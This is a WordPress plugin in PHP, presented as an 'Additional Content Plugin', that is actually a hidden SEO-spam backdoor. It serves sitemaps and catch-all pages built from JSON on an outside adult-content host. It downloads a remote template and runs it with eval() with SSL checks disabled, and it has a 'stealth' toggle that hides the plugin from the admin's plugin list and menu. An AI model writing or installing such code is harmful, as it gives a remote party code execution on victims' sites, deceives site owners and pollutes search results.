<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth dengan Sitemap Index (jav.xml) dan Prioritas Nuklir.
Version: 7.0
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL DEFAULT
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');
define('ACP_MAX_URLS_PER_SITEMAP', 10000); // Batas 10k per file
define('ACP_MAIN_SITEMAP', 'jav.xml'); // Nama sitemap induk

// ==========================================
// 1. SUPER EARLY INTERCEPT (SITEMAP HANDLER)
// ==========================================
add_action('plugins_loaded', 'acp_nuclear_intercept', -9999);
function acp_nuclear_intercept() {
    // Cek jika request mengandung .xml
    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '.xml') !== false) {
        
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $filename = basename($path); // misal: jav.xml atau sasas.xml atau sasas-2.xml
        
        // --- A. HANDLE SITEMAP INDEX (jav.xml) ---
        if ($filename === ACP_MAIN_SITEMAP) {
            acp_render_sitemap_index();
            exit;
        }

        // --- B. HANDLE CHILD SITEMAPS ---
        // Bersihkan nama file
        $filename_no_ext = str_replace('.xml', '', $filename);
        $sitemap_name = $filename_no_ext;
        $page = 1;

        // Cek pola pagination (nama-2)
        if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
            $sitemap_name = $matches[1];
            $page = intval($matches[2]);
        }

        // Cari endpoint aktif
        $endpoints = get_option('acp_endpoints', []);
        if (empty($endpoints)) return;

        $target_endpoint = false;
        foreach ($endpoints as $ep) {
            if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
                $target_endpoint = $ep;
                break;
            }
        }

        // Jika ketemu endpoint yang cocok, render isinya
        if ($target_endpoint) {
            acp_render_child_sitemap($target_endpoint, $page);
            exit;
        }
    }
}

// FUNGSI RENDER SITEMAP INDEX (jav.xml)
function acp_render_sitemap_index() {
    if (!headers_sent()) {
        header('HTTP/1.1 200 OK');
        header('Content-Type: application/xml; charset=utf-8');
        header('X-Robots-Tag: noindex, follow');
    }

    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;

        // Kita harus hitung jumlah URL di JSON untuk tahu butuh berapa pecahan file
        $total_urls = acp_get_json_count($ep['json_filename']);
        $total_pages = ceil($total_urls / ACP_MAX_URLS_PER_SITEMAP);
        
        if ($total_pages < 1) $total_pages = 1;

        // Loop untuk membuat entry sitemap anak
        for ($i = 1; $i <= $total_pages; $i++) {
            $suffix = ($i === 1) ? '' : '-' . $i;
            $loc = home_url($ep['sitemap_name'] . $suffix . '.xml');
            
            echo "\t<sitemap>\n";
            echo "\t\t<loc>" . esc_url($loc) . "</loc>\n";
            echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
            echo "\t</sitemap>\n";
        }
    }

    echo '</sitemapindex>';
}

// FUNGSI RENDER CHILD SITEMAP (isi konten)
function acp_render_child_sitemap($endpoint, $page) {
    if (!headers_sent()) {
        header('HTTP/1.1 200 OK');
        header('Content-Type: application/xml; charset=utf-8');
        header('X-Robots-Tag: noindex, follow');
    }

    $json_url = ACP_JSON_BASE_URL . $endpoint['json_filename'] . '.json';
    $konten_data = acp_fetch_json($json_url);

    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    
    if (!empty($konten_data) && is_array($konten_data)) {
        $chunks = array_chunk($konten_data, ACP_MAX_URLS_PER_SITEMAP, true);
        $chunk_index = $page - 1;

        if (isset($chunks[$chunk_index])) {
            foreach ($chunks[$chunk_index] as $title => $desc) {
                echo "\t<url>\n";
                echo "\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n";
                echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
                echo "\t\t<changefreq>weekly</changefreq>\n";
                echo "\t</url>\n";
            }
        }
    } else {
        echo "";
    }
    
    echo '</urlset>';
}

// HELPER: Fetch & Cache JSON (Return Array)
function acp_fetch_json($url) {
    // Bypass SSL verify for speed/compatibility
    $response = wp_remote_get($url, ['timeout' => 30, 'sslverify' => false]);
    if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (is_array($data)) return $data;
    }
    return [];
}

// HELPER: Get JSON Count (Cached separately to avoid heavy load on Index)
function acp_get_json_count($filename) {
    $cache_key = 'acp_cnt_' . md5($filename);
    $count = get_transient($cache_key);
    
    if ($count === false) {
        $data = acp_fetch_json(ACP_JSON_BASE_URL . $filename . '.json');
        $count = count($data);
        // Cache count selama 12 jam agar jav.xml ringan
        set_transient($cache_key, $count, 12 * HOUR_IN_SECONDS);
    }
    
    return intval($count);
}


// ==========================================
// 2. FITUR STEALTH & ADMIN
// ==========================================

add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false)) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
    }
    return $plugins;
}

add_action('admin_menu', 'acp_admin_menu', 999);
function acp_admin_menu() {
    add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
    if (get_option('acp_plugin_hidden', false)) {
        remove_menu_page('additional-content-plugin');
    }
}

function acp_generate_random_string($length = 5) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
}

function acp_admin_page() {
    // Toggle Visibility
    if (isset($_POST['acp_toggle_visibility'])) {
        check_admin_referer('acp_action');
        $curr = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$curr);
    }
    // Setup Endpoints
    if (isset($_POST['acp_setup_endpoints'])) {
        check_admin_referer('acp_action');
        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new = [];
            for ($i = 0; $i < $count; $i++) {
                $new[] = [
                    'json_filename' => acp_generate_random_string(10),
                    'sitemap_name'  => acp_generate_random_string(5),
                    'status'        => 'pending'
                ];
            }
            update_option('acp_endpoints', $new);
        }
    }
    // Generate Action
    if (isset($_POST['acp_generate_action'])) {
        check_admin_referer('acp_action');
        $endpoints = get_option('acp_endpoints', []);
        
        // Hapus cache count lama saat generate ulang agar akurat
        foreach ($endpoints as $ep) {
            delete_transient('acp_cnt_' . md5($ep['json_filename']));
        }

        foreach ($endpoints as &$ep) {
            $ep['status'] = 'active';
        }
        update_option('acp_endpoints', $endpoints);
        echo '<div class="updated"><p><strong>Sitemap Index (jav.xml) berhasil diperbarui!</strong></p></div>';
    }
    // Reset
    if (isset($_POST['acp_reset'])) {
        check_admin_referer('acp_action');
        delete_option('acp_endpoints');
    }

    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);
    $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
    ?>
    <div class="wrap">
        <h1>Content Plugin (V7.0 Sitemap Index)</h1>
        
        <?php if ($is_hidden): ?>
            <div class="notice notice-error" style="padding:10px;">
                <strong>MODE STEALTH AKTIF!</strong> Menu admin disembunyikan.
            </div>
        <?php endif; ?>

        <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
            <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide Plugin' : 'Hide Plugin'; ?>">
            </form>
        </div>

        <?php if (!$endpoints): ?>
            <div class="card" style="max-width:400px; padding:20px;">
                <h3>Setup Awal</h3>
                <form method="post">
                    <?php wp_nonce_field('acp_action'); ?>
                    <p>Jumlah JSON: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
                    <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Siapkan Endpoint">
                </form>
            </div>
        <?php else: ?>
            
            <div style="background:#e7f5fe; padding:20px; margin-bottom:20px; border:1px solid #00a0d2; border-radius:5px; text-align:center;">
                <h2>Sitemap Utama (Index)</h2>
                <p>Submit URL ini ke Google Search Console. URL ini otomatis berisi link ke semua file XML anak.</p>
                
                <div style="display:flex; justify-content:center; align-items:center; gap:10px; margin-top:15px;">
                    <input type="text" id="main_sitemap_input" value="<?php echo esc_attr($main_sitemap_url); ?>" class="regular-text" style="width:400px; text-align:center; font-weight:bold; font-size:16px; padding:10px;" readonly>
                    <button type="button" class="button button-primary button-hero acp-copy" data-target="main_sitemap_input">COPY URL</button>
                </div>
                <br>
                <a href="<?php echo esc_url($main_sitemap_url); ?>" target="_blank">Lihat jav.xml (Preview)</a>
            </div>

            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <h3>Daftar File JSON</h3>
                <table class="wp-list-table widefat fixed striped">
                    <thead><tr><th width="50">No</th><th>Nama File JSON</th><th>Status</th></tr></thead>
                    <tbody>
                        <?php foreach ($endpoints as $i => $ep): 
                            $is_active = isset($ep['status']) && $ep['status'] === 'active';
                        ?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td>
                                <input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:200px;" readonly onclick="this.select()"> .json
                                <br><small style="color:#666">Upload ke: <?php echo ACP_JSON_BASE_URL . $ep['json_filename']; ?>.json</small>
                            </td>
                            <td>
                                <?php if ($is_active): ?>
                                    <span style="color:green; font-weight:bold;">AKTIF</span>
                                <?php else: ?>
                                    <span style="color:#999;">Menunggu Generate...</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <p class="submit"><input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="GENERATE SITEMAP INDEX (jav.xml)"></p>
            </form>
            <hr>
            <form method="post" onsubmit="return confirm('Reset?');">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_reset" class="button button-link-delete" value="Reset Konfigurasi">
            </form>
        <?php endif; ?>
    </div>
    <script>
    jQuery(document).ready(function($){
        $('.acp-copy').click(function(){
            var t = document.getElementById($(this).data('target'));
            t.select(); document.execCommand('copy');
            var btn = $(this);
            var originalText = btn.text();
            btn.text('COPIED!');
            setTimeout(function(){ btn.text(originalText); }, 2000);
        });
    });
    </script>
    <?php
}

// ==========================================
// 3. CONTENT HANDLER (Rewrite Rule)
// ==========================================
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
}
add_filter('query_vars', function($v){ $v[] = 'acp_value'; return $v; });

add_action('template_redirect', 'acp_display_content');
function acp_display_content() {
    $val = get_query_var('acp_value');
    if (!$val) {
        $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
        if (!empty($path) && !is_admin() && !get_page_by_path($path)) {
             $val = $path;
        } else {
            return;
        }
    }
    $title = sanitize_text_field(urldecode($val));
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
        
        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
        $cache_key = 'acp_c_' . md5($json_url);
        $data = get_transient($cache_key);
        if ($data === false) {
            $resp = wp_remote_get($json_url, ['timeout'=>10, 'sslverify'=>false]);
            if (!is_wp_error($resp)) {
                $data = json_decode(wp_remote_retrieve_body($resp), true);
                set_transient($cache_key, $data, 3600);
            }
        }
        if (is_array($data)) {
            foreach ($data as $k => $v) {
                if (strtolower($k) === strtolower($title)) {
                    $additional_content = $v;
                    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['sslverify'=>false]);
                    if (!is_wp_error($tpl)) {
                        ob_start();
                        eval('?>' . wp_remote_retrieve_body($tpl));
                        echo ob_get_clean();
                        exit;
                    }
                }
            }
        }
    }
}
